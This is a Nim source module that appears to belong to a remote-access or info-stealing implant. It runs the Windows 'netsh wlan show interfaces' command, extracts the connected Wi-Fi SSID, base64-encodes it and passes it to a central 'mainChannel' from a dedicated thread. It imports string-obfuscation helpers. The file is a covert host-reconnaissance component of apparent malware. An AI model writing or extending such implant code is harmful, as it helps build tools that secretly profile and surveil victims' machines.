from strutils import split
from strutils import contains

from base64 import encode

import ../functions/runCmd

from ../channels import mainChannel

from ../functions/hideString import e
from ../functions/hideString import d

proc getConnectedWifi(): void =
  let netshOutout1: string = runCmd "netsh wlan show interfaces"

  for line in netshOutout1.split "\n":
    if line.contains("SSID") and not line.contains("BSSID"):
      let SSID: string = line.split(": ")[1]

      mainChannel.send ("cw", encode SSID)


proc initConnectedWifiThread*(): void {.thread.} =
  getConnectedWifi()
